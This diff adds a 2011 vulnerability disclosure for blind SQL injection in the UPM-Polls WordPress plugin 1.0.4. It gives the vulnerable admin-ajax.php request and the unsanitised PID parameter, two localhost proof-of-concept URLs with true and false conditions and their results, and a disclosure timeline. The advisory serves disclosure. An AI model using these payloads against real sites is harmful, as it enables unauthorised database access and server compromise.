@@ -1,0 +1,48 @@
+# Exploit Title: BLIND SQL injection UPM-POLLS wordpress plugin 1.0.4
+# Google Dork: n/a
+# Date: 04-12-2011
+# Author: Saif El-Sherei
+# Software Link: http://downloads.wordpress.org/plugin/upm-polls.1.0.4.zip
+# Version: 1.0.4
+# Tested on: wordpress 3.2.1,Firefox 4, XAMPP
+
+
+Info:
+
+Best Plugin to create Polls for your site. Everything is smoother, faster,
+and seamless like WordPress itself.
+
+    Poll Manager,
+        Ability to set general and post/page specific polls,
+        Ability to leaf over the polls
+        Ability to add certain poll in certain post content
+        Ability to show polls either with and without current results of
+polls
+
+
+Details:
+
+the Variable PID is not properly sanitized in the get request before
+insertion into the database query; allowing an attaacker or any user who
+can view poll results (supposedly   all user) to use blind sql injection to
+extract database data and possibly compromise the whole server. a POC is
+provided with both true and false results.
+
+POC 1(TRUE):
+
+http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=upm_ayax_polls_result&do=result&post=1&type=general&PID=2and
+1=1
+
+"poll results for poll 2 is displayed"
+
+POC 2 (FALSE):
+
+http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=upm_ayax_polls_result&do=result&post=1&type=general&PID=2and
+1=2
+
+"Blank page is displayed"
+
+Time Line:
+04-12-2011 Vulnerability discovered
+04-12-2011 Vendor notified
+11-12-2011 No response from vendor, public disclosure
